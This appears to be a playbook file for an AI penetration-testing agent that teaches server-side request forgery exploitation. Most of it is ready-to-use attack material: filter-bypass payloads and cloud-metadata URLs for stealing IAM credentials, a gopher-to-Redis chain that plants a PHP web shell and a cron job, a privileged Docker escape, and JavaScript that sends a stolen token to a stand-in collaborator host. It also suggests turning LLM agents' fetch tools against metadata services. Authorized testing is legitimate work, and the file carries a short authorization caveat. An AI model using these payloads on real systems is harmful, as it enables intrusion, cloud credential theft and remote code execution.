---
name: SSRF Testing
description: Force the server to make attacker-chosen requests, proving impact by retrieving an internal/cloud-metadata response or a token-correlated out-of-band callback.
tags: [web, ssrf, owasp-a10]
recommended_tools: [http_repeater, http_request, nuclei_scan, arjun_parameter_discovery, ffuf_scan]
vuln_classes: [ssrf]
domain: web
phase: exploitation
---
# SSRF Testing

SSRF makes the server fetch a URL you control. The proof bar is **the internal response coming back** (cloud metadata, internal service body) or a **token-correlated OAST callback originating from the target**. A bare DNS ping with no correlation, or a timing blip alone, is a *lead*, not proof.

## Where to look
Any field that triggers a server-side fetch: `url=`, `uri=`, `dest=`, `target=`, `redirect=`, `next=`, `fetch=`, `image=`, `proxy=`, `callback=`/webhook fields, PDF/HTML-to-image/preview/thumbnail generators, XML/SVG importers (XXE-adjacent), link-unfurlers, and avatar-by-URL. Use `arjun_parameter_discovery` to find hidden URL params.

## Detection -> confirmation -> escalation ladder
1. **OAST callback (most reliable for blind).** Point the param at a unique, token-tagged collaborator host: `http://<token>.oast.example/`. A request arriving *from the target's egress IP* carrying your token confirms server-side fetch. DNS-only with no HTTP and no token correlation is weak — push for an HTTP hit or a reflected body.
2. **Internal probes.** `http://127.0.0.1/`, `http://localhost:<port>/`, `http://[::]`, `http://0.0.0.0`, internal hostnames. Distinguish by status/body/length/timing vs. an external control. A returned internal page body = strong proof.
3. **Cloud metadata (critical).** Retrieve the actual response:
   - AWS IMDSv1: `http://169.254.169.254/latest/meta-data/` then `.../iam/security-credentials/<role>` -> `AccessKeyId`/`SecretAccessKey`/`Token`. Look for the literal `ami-id`, `instance-id`, role JSON.
   - GCP: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` (needs header `Metadata-Flavor: Google`).
   - Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (needs header `Metadata: true`).
   Capturing the metadata body (especially `169.254.169.254` content / `ami-id`) is the deterministic critical signal.
4. **Escalate.** Stolen IAM creds -> AWS API calls / S3 read; reach internal admin panels, Redis/Memcached via `gopher://`, or read files via `file://`. SSRF (partial) -> metadata -> credential theft is the canonical chain.

## IP / host bypass table (when localhost/metadata is filtered)
| Technique | Example payload | Mechanism |
|---|---|---|
| Decimal IP | `http://2130706433/` | 127.0.0.1 as a 32-bit integer |
| Octal IP | `http://0177.0.0.1/` | Octal octet notation |
| Hex IP | `http://0x7f.0x0.0x0.0x1/` | Hexadecimal octets |
| Short IP | `http://127.1/` | Abbreviated dotted form |
| IPv6 loopback | `http://[::1]/` | Loopback in IPv6 |
| IPv4-mapped IPv6 | `http://[::ffff:127.0.0.1]/` | IPv4 embedded in v6 |
| Mixed hex IPv6 | `http://[::ffff:0x7f000001]/` | Rare format; parser leniency |
| DNS rebinding | attacker DNS, TTL 0, 1st=external 2nd=`127.0.0.1` | Validation and fetch resolve differently |
| Redirect chain | external URL -> `302 Location: http://169.254.169.254/...` | Validator sees external, fetcher follows hop |
| CNAME to internal | attacker domain CNAME -> internal hostname | DNS points inward, passes name allowlist |
| URL parser confusion | `http://expected.com#@169.254.169.254/`, `http://169.254.169.254:80@expected.com/`, `http://localhost%23@attacker.com/internal` | Disagreement on `@`/`#`/userinfo boundary |

Also test scheme abuse: `file:///etc/passwd`, `gopher://127.0.0.1:6379/_<redis cmds>`, `dict://127.0.0.1:11211/`, and double-URL-encoding the host (`%2569...`) where parsing order differs.

## Exact proof to capture
The **parameter**, the **payload URL** (including which bypass), and one of: the **retrieved internal/metadata response body** (e.g. the `169.254.169.254` `ami-id`/IAM JSON), or a **token-correlated OAST HTTP callback from the target's IP**. Note response status/length deltas that localized the internal target.

## Tooling
- `nuclei_scan -t ssrf` / `-tags ssrf` with its built-in interactsh for token-correlated OAST detection across many params at once.
- Manual `http_request` (precise control of host + headers needed for GCP/Azure metadata):
  `GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1` — read the raw body.
- `http_repeater` to iterate the bypass table against one param and diff responses.
- `ffuf_scan` to fuzz internal ports/paths once SSRF reach is confirmed: `-w ports.txt -u 'https://t/fetch?url=http://127.0.0.1:FUZZ/'` and filter by size/status.
- `arjun_parameter_discovery` to discover the fetch parameter in the first place.

## Chaining
SSRF -> IMDS creds -> cloud account pivot. SSRF + `gopher://` -> internal Redis RCE. SSRF in an SVG/XML importer overlaps with XXE (`file://`, internal fetch). Redirect-chain SSRF bypasses allowlists that only validate the first URL.

## Safety / CWE
Only hit metadata/internal endpoints you are authorized to reach; do not exfiltrate live cloud credentials beyond the minimum proof, and rotate/report any captured tokens. Keep OAST payloads token-scoped. CWE-918.


<!-- Ingested from reference frameworks (skill-ingestion) -->
## OAST-oracle-FIRST discipline (timeout is NEVER proof)
Establish a confirmed-egress interactsh callback before any internal probe. Bind each `{OAST}` subdomain to a per-finding correlation id.
```
interactsh-client -server <provider> -json -v > /tmp/interactsh.log 2>&1 &
curl -s --max-time 10 'https://TARGET/fetch?url=https://{OAST}/ssrf-oracle'
```
Proof signal: live interactsh callback, OR internal-service banner in body (Redis/Jenkins title), OR consistent status/length/timing bucket differentiating open vs closed internal ports.

## Address-encoding bypass variants (loopback/metadata)
```
http://127.0.0.1/  http://[::1]/  http://0.0.0.0/  http://127.1/
http://2130706433/ (decimal)  http://0x7f000001/ (hex)  http://017700000001/ (octal)
http://attacker.com@169.254.169.254/   (userinfo confusion)
http://169.254.169.254#@attacker.com/  (fragment confusion)
http://169.254.169.254.nip.io/         (DNS resolver to internal)
http://make-1.2.3.4-rebind-169.254.169.254.1u.ms/  (DNS rebind)
```
Semi-blind timing oracle: compare dead IP `http://10.255.255.1` (slow) vs `http://example.com` (fast) vs `http://127.0.0.1:22` to classify reachability.

## Cloud metadata extraction per provider (incl. IMDSv2)
```
AWS v1:   http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
AWS v2:   PUT http://169.254.169.254/latest/api/token  (X-aws-ec2-metadata-token-ttl-seconds: 21600) then GET with token header
AWS IPv6: http://[fd00:ec2::254]/latest/meta-data/   (may bypass v1-disabled)
GCP:      http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token  (Metadata-Flavor: Google)
Azure:    http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/  (Metadata: true)
Alibaba:  http://100.100.100.200/latest/meta-data/ram/security-credentials/
CRLF hdr: http://metadata.google.internal/computeMetadata/v1/%0d%0aMetadata-Flavor:%20Google%0d%0a
```
Proof signal: IAM/SA credential JSON (`AccessKeyId`/token), or `AKIA[A-Z0-9]{16}` in body, or `instance-id`/`ami-id`/`project-id`/`subscriptionId`. Treat server-side network errors (`ECONNREFUSED`, `Max retries exceeded`, `java.net.ConnectException`) as evidence the fetch was attempted server-side.

## Gopher/scheme smuggling SSRF -> RCE (no scheme allowlist)
```
Redis INFO:    gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a
Redis->cron:   CONFIG SET dir /var/spool/cron/; CONFIG SET dbfilename root; SET x '*/1 * * * * id'; SAVE  (CRLF-encoded gopher)
Redis->shell:  CONFIG SET dir /var/www/html; CONFIG SET dbfilename shell.php; SET x "<?php system($_GET['cmd']); ?>"; SAVE
Docker API:    POST /containers/create {"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/host"],"Privileged":true}
Elasticsearch: http://127.0.0.1:9200/_all/_search?q=password
Consul KV:     http://127.0.0.1:8500/v1/kv/?recurse
gopher SMTP:   gopher://{OAST}:25/_HELO%20x
dict memcache: dict://{OAST}:11211/stat
```
Proof signal: OAST callback from injected cron/command, or Docker `/containers/json` reachable then exec yields host shell.

## Hardening fingerprints (when to stop chaining bypasses)
Uniform 4xx across all encodings, identical response for hex/octal/decimal IP forms, redirect re-validation, scheme allowlist enforced. After 4+ such signals fire on a sink, pivot rather than burn turns.

## Modern techniques & real-world CVEs (via recon-skills)

### URL-echo is NOT SSRF — the SharePoint false-positive trap
A server folding your URL into an *error string* is not an outbound fetch. `/_layouts/15/download.aspx?SourceUrl=` returns HTTP 500 titled `"The Web application at <attacker-URL> could not be found"`. This looks like SSRF but 38 Collaborator-tagged payloads across 12+ URL params yielded **zero DNS/HTTP callbacks** — it's a SharePoint-internal `SPFile`/`SPWebApplication` resolver doing client-side error formatting, not a URL fetcher. Reporting it would be N/A'd at triage. Rules for distinguishing string-formatting from a real fetch:
- Status-code deltas between an external URL and `localhost` can come from a scheme validator, not a fetch.
- A response *delay* can be in-parser DNS resolution, not a completed HTTP request.
- **Only** a token-correlated DNS/HTTP callback (or a returned internal body) confirms. If zero callbacks fire across all sub-tagged sinks, retract the SSRF claim even when the URL is echoed.

Sub-tag every collaborator subdomain per sink (`import.<collab>`, `preview.<collab>`, `dlsrcurl.<collab>`) so a callback tells you *which* parameter fired.

### WordPress `xmlrpc.php` pingback timing oracle (blind IMDS extraction)
When SSRF is confirmed but the body is never returned (classic WP `pingback.ping` faultCode 0), IMDS response *size* correlates with response *time* — enumerate IAM roles and extract metadata blind:
```python
import subprocess, time
def ssrf_time(url):
    xml = f'''<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName>
<params><param><value><string>{url}</string></value></param>
<param><value><string>https://target.com/</string></value></param></params></methodCall>'''
    start = time.perf_counter()
    subprocess.run(["curl","-sk","-X","POST","https://target.com/xmlrpc.php",
        "-H","Content-Type: text/xml","-d",xml], capture_output=True, timeout=15)
    return time.perf_counter() - start

baseline = ssrf_time("http://169.254.169.254/latest/meta-data/")
for role in ["admin","ec2","s3","lambda","ecs","SSM-Role","EC2Role"]:
    t = ssrf_time(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}")
    print(f"{role}: {t:.3f}s -> {'FOUND' if t > baseline*1.15 else '404'}")
```
Field evidence (2026): `/meta-data/` 344ms, `/iam/security-credentials/` 435ms, `/instance-id` 301ms — a role that exists returns a JSON credential blob (slower) vs a 404 (tiny/faster). Network jitter is ±50ms: run each probe 3x and take the median; skip if baseline variance exceeds 20%.

### Kubernetes / aggregated-API SSRF (redirect-followed proxy trust)
Cloud-native targets add internal ports worth probing once egress is confirmed:
```
http://127.0.0.1:6443/api/v1/namespaces   http://10.0.0.1:6443/api/v1/secrets  (kube-apiserver)
http://127.0.0.1:10250/pods               (kubelet)
http://127.0.0.1:2379/v2/keys             (etcd)
http://127.0.0.1:9090/                    (Prometheus)
http://127.0.0.1:8500/v1/catalog/services (Consul)
```
A registrable Kubernetes API **extension server** (metrics-server equivalent) that returns `302 Location: http://127.0.0.1:6443/api/v1/secrets` weaponizes the aggregation layer itself: the proxy follows the redirect with its *elevated cluster credentials* and returns internal secrets — SSRF-via-trusted-infra privilege escalation with only API-registration rights. Any aggregation/proxy layer that blindly follows 30x from a registered backend is the sink to hunt.

### Headless-browser / PDF-generator SSRF (JS-execution context)
PDF renderers and screenshot services (Puppeteer, PhantomJS, wkhtmltopdf) execute attacker JS in a network-privileged context — the highest-value SSRF subclass. Inject a metadata fetch into the rendered template and exfil via the rendered output or DNS-encoded subdomain:
```javascript
fetch('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
  {headers:{'Metadata-Flavor':'Google'}}).then(r=>r.text()).then(d=>{
    new Image().src='https://'+btoa(d).replace(/=/g,'')+'.YOUR.collab.com'; });
```
Or embed `<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` into a user-controlled template fragment — an unsanitised server-side render reflects the IMDS body straight into the PDF (H1 #2262382, PDF-generator → AWS IMDSv1, $25k, CVSS 10.0).

### Disclosed reports (2018-2024) — chains & root causes
| Report | Subclass | Payload / mechanism | Root cause |
|---|---|---|---|
| H1 #2262382 (Analytics PDF, $25k, 2023) | headless PDF → AWS IMDSv1 | injected `<iframe src=169.254.169.254/.../security-credentials/>` reflected into rendered PDF | untrusted template fragment rendered, no IMDSv2 |
| H1 #341876 (Shopify Exchange, $25k, 2018) | GCP metadata → container root | edited `password.liquid` to fetch `metadata.google.internal` w/ `Metadata-Flavor: Google`, triggered screenshotter | screenshotter had no metadata-host blocklist |
| H1 #1369312 (Concrete CMS, 2021) | DNS rebinding → AWS IAM | file-upload-from-URL; DNS alternated `1.2.3.4` ↔ `169.254.169.254`, won race in 2-3 tries | validated hostname resolved once, fetch re-resolved without IP pinning |
| Yahoo Mail ($15k, 2020) | gopher → Redis RCE | 302 from attacker host to `gopher://internal-redis:6379/_...flushall...SET /var/spool/cron/root...BGSAVE` | gopher not blocklisted, unauth Redis, 302 followed |
| H1 #1960765 (Reddit Matrix, $6k, 2023) | blind link-preview port-scan | `/_matrix/media/r0/preview_url/?url=http://10.0.0.0:80/`; IPs/ports leaked via response deltas | fetcher didn't reject RFC1918/link-local; allowlist-by-scheme only |
| Azure DevOps ($15k, 2023-24) | webhook + DNS rebinding → Azure IMDS | service-hook / `endpointproxy` URL to rebinding host; **CRLF in URL path** injected the required `Metadata: true` header | validate-then-fetch with separate DNS lookups + CRLF header injection |

Key modern pattern: **CRLF-in-path header injection** lets otherwise-unusable SSRF reach header-gated metadata services (Azure `Metadata: true`, GCP `Metadata-Flavor: Google`). **DNS rebinding (validate-then-fetch TOCTOU)** and **allowlist-then-follow-redirect** remain the two dominant filter bypasses in disclosed 2021-2024 cases.

### Chaining reminders
SSRF → IMDSv1 token → `sts:AssumeRole` / cross-account cloud pivot. SSRF + gopher → internal unauth Redis `CONFIG SET dir` → cron/authorized_keys RCE. LLM agents with a `fetch_url` tool are live SSRF proxies that bypass network egress controls — point the tool at IMDS. CWE-918.
